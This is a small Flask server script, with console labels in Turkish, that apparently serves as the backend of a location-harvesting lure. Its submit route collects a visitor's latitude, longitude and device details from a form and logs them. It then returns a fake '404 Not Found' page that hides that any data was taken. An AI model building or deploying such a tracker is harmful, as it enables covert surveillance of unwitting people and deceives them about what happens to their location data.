from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    lat = request.form.get("lat")
    lon = request.form.get("lon")
    device = request.form.get("device")

    print("\n--- Yeni giriş ---")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Cihaz: {device}")
    print("------------------\n")

    return "<h1>404 Not Found</h1><p>Page not found.</p>"

if __name__ == "__main__":
    app.run(debug=True)
